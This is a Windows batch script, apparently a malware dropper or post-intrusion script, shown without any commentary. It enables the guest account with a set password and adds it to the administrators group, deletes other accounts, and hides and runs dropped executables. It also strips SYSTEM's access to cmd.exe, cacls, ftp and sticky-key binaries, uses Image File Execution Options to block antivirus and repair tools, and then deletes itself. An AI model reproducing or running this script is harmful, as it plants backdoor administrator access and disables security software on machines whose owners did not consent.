echo 日>>%SystemRoot%\system32\1.txt
echo 高兴>>msinclude.dll
echo sb>>mcsql.exe
echo sb>>mdsql.exe
echo sb>>mmsql.exe
echo sb>>m1sql.exe
echo sb>>ssqldebug.exe
net1 user guest rinimabi
net1 user guest rinimabi /ad
net1 user guest /active:y
net1 localgroup administrators guest /ad
net1 user admin /del
net1 user sopo /del
attrib -s -r -h %SystemRoot%\\system32\\snmptrp.exe
attrib +s +r +h %SystemRoot%\\system32\\mdsql.exe
attrib +s +r +h %SystemRoot%\\system32\\ssqldebug.exe
attrib +s +r +h %SystemRoot%\\system32\\mmsql.exe
attrib +s +r +h %SystemRoot%\\system32\\m1sql.exe
convert C: /FS:NTFS
attrib -s -r -h %SystemRoot%\\system32\\cacls.exe
attrib -s -r -h %SystemRoot%\\system32\\ftp.exe
attrib -s -r -h %SystemRoot%\\system32\\cmd.exe
%systemroot%\system32\qq.exe
%systemroot%\system32\qq1.exe
%systemroot%\system32\qq2.exe
%systemroot%\system32\qq3.exe
%systemroot%\system32\qq4.exe
%systemroot%\system32\qq5.exe
copy %systemroot%\system32\\cacls.exe %systemroot%\system32\cs.exe
copy %systemroot%\system32\dllcache\cacls.exe %systemroot%\system32\cs.exe
copy %systemroot%\system32\\net1.exe %systemroot%\system32\n.exe
%systemroot%\\system32\\cacls.exe net1.exe /E /D system
%systemroot%\\system32\\cacls.exe msinclude.dll /E /D system
%systemroot%\\system32\\cacls.exe mcsql.exe /E /D system
%systemroot%\\system32\\cacls.exe ftp.exe /E /D system
%systemroot%\\system32\\cacls.exe sethc.exe /E /D system
%systemroot%\\system32\\cacls.exe cscript.exe /E /D system
%systemroot%\\system32\\cacls.exe cmd.exe /E /D system
%systemroot%\\system32\\cacls.exe wscript.exe /E /D system
%systemroot%\\system32\\cacls.exe cacls.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\net1.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\msinclude.dll /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\ftp.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\sethc.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\utilman.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\cscript.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\cmd.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\wscript.exe /E /D system
%systemroot%\\system32\\cacls.exe %systemroot%\\system32\\dllcache\\cacls.exe /E /D system
%systemroot%\\system32\\cs.exe cmd.exe /E /D system
%systemroot%\\system32\\cs.exe net1.exe /E /D system
%systemroot%\\system32\\cs.exe msinclude.dll /E /D system
%systemroot%\\system32\\cs.exe mcsql.exe /E /D system
%systemroot%\\system32\\cs.exe ftp.exe /E /D system
%systemroot%\\system32\\cs.exe sethc.exe /E /D system
%systemroot%\\system32\\cs.exe cscript.exe /E /D system
%systemroot%\\system32\\cs.exe wscript.exe /E /D system
%systemroot%\\system32\\cs.exe cacls.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\cmd.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\net1.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\msinclude.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\ftp.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\sethc.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\utilman.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\cscript.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\wscript.exe /E /D system
%systemroot%\\system32\\cs.exe %systemroot%\\system32\\dllcache\\cacls.exe /E /D system
del %systemroot%\system32\qq.exe
del %systemroot%\system32\qq1.exe
del %systemroot%\system32\qq2.exe
del %systemroot%\system32\qq3.exe
del %systemroot%\system32\qq4.exe
del %systemroot%\system32\qq5.exe
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ftp.exe" /v debugger /t reg_sz /d debugfile.exe /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\reg.exe" /v debugger /t reg_sz /d debugfile.exe /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cacls.exe" /v debugger /t reg_sz /d debugfile.exe /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\360safe.exe" /v debugger /t reg_sz /d debugfile.exe /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\修复工具.exe" /v debugger /t reg_sz /d debugfile.exe /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\egui.exe" /v debugger /t reg_sz /d debugfile.exe /f
del %0%
del 封.bat
del %SystemRoot%\\system32\\temp\\封.bat
del %systemroot%\system32\qq3.exe
exit